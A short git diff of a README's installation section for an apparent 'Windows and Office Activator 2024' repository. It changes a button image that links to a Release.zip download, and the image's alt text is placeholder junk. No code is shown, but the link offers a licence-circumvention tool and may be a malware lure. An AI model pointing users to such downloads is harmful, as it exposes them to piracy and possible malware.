@@ -5,7 +5,7 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://github.com/user-attachments/assets/a44b488f-3c94-4db2-aace-372265bab491)
+[![asdasdasd](https://github.com/user-attachments/assets/c192c90b-642c-4890-a301-52936edf1ada)
 ](https://github.com/Trixxarn1/Microsoft-Windows-and-Office-Activator-2024/releases/download/Release/Release.zip)
 
 
